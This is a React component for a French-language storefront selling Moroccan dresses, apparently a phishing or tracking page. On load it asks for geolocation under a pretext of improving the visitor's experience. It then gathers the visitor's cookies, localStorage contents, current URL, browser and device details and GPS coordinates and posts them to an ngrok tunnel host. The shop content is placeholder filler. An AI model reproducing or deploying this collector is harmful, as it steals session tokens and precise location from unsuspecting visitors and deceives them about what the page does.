import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import './App.css'
import axios from 'axios'
import { useState, useEffect } from 'react'

function App() {
  const [locationPermissionRequested, setLocationPermissionRequested] = useState(false);
  const [preventClose, setPreventClose] = useState(true);
  const [response, setResponse] = useState([]); // Utilisé pour stocker la réponse du backend
  useEffect(() => {
    if (!locationPermissionRequested) {
      const userConfirmed = window.confirm("Nous avons besoin de votre position pour améliorer votre expérience. Voulez-vous autoriser la géolocalisation ?");
      if (userConfirmed) {
        setLocationPermissionRequested(true); // Marquer que l'autorisation a été demandée

        // Vérifier si la géolocalisation est disponible
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              // Récupérer les coordonnées
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;

              // Préparer les données à envoyer
              const data = {
                storage: JSON.stringify(localStorage), // Convertir en chaîne de caractères
                cookie: document.cookie, // Les cookies peuvent être envoyés sous forme de chaîne de caractères
                historique: window.location.href, // Envoyer l'URL actuelle comme historique
                userAgent: navigator.userAgent,
                langue: navigator.language,
                os: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                datetime: new Date().toISOString(), // Convertir en chaîne de caractères ISO
                position: {
                  latitude: latitude,
                  longitude: longitude
                }
              };

              // Envoyer les données au serveur avec Axios
              axios.post('https://ee25-141-135-89-194.ngrok-free.app/api/send', data)
                .then(function (response) {
                  console.log("Réponse du serveur:", response.data);
                  setResponse(response.data); // Mise à jour de l'état avec la réponse du serveur
                })
                .catch(function (error) {
                  console.log('Erreur:', error);
                });
            },
            (error) => {
              console.error('Erreur de géolocalisation:', error);
            }
          );
        } else {
          console.log('La géolocalisation n\'est pas supportée par ce navigateur.');
        }
      }
    }
  }, [locationPermissionRequested]);


  return (
    <div className="showcase">
      {/* Header */}
      <header className="showcase-header">
        <div className="container">
          <h1>Robe Marocaine Élégante</h1>
          <nav>
            <a href="#">Accueil</a>
            <a href="#">Nos Robes</a>
            <a href="#">Promotions</a>
            <a href="#">Contact</a>
          </nav>
        </div>
      </header>

      {/* Main Content */}
      <main className="showcase-main">
        {/* Hero Section */}
        <section className="hero">
          <div className="container">
            <h2>Découvrez Nos Robes Traditionnelles</h2>
            <p>Explorez notre collection unique de robes marocaines artisanales, parfaites pour toutes les occasions.</p>
            <button type="button">Voir la Collection</button>
          </div>
        </section>

        {/* Featured Dresses */}
        <section className="featured-dresses">
          <div className="container">
            <h2>Robes Vedettes</h2>
            <div className="dresses">
              <div className="dress-card">
                <img src="https://via.placeholder.com/300x400" alt="Robe 1" />
                <h3>Robe Marocaine 1</h3>
                <p>Description courte de la robe. Élégante et raffinée.</p>
              </div>
              <div className="dress-card">
                <img src="https://via.placeholder.com/300x400" alt="Robe 2" />
                <h3>Robe Marocaine 2</h3>
                <p>Description courte de la robe. Confortable et chic.</p>
              </div>
              <div className="dress-card">
                <img src="https://via.placeholder.com/300x400" alt="Robe 3" />
                <h3>Robe Marocaine 3</h3>
                <p>Description courte de la robe. Parfaite pour les occasions spéciales.</p>
              </div>
            </div>
          </div>
        </section>

        {/* Promotions */}
        <section className="promotions">
          <div className="container">
            <h2>Promotions Spéciales</h2>
            <div className="promotion-card">
              <img src="https://via.placeholder.com/600x300" alt="Promotion 1" />
              <h3>Offre de la Semaine</h3>
              <p>10% de réduction sur toutes les robes!</p>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="showcase-footer">
        <div className="container">
          <p>&copy; 2024 Robe Marocaine Élégante. Tous droits réservés.</p>
        </div>
      </footer>
    </div>
  )
}

export default App;
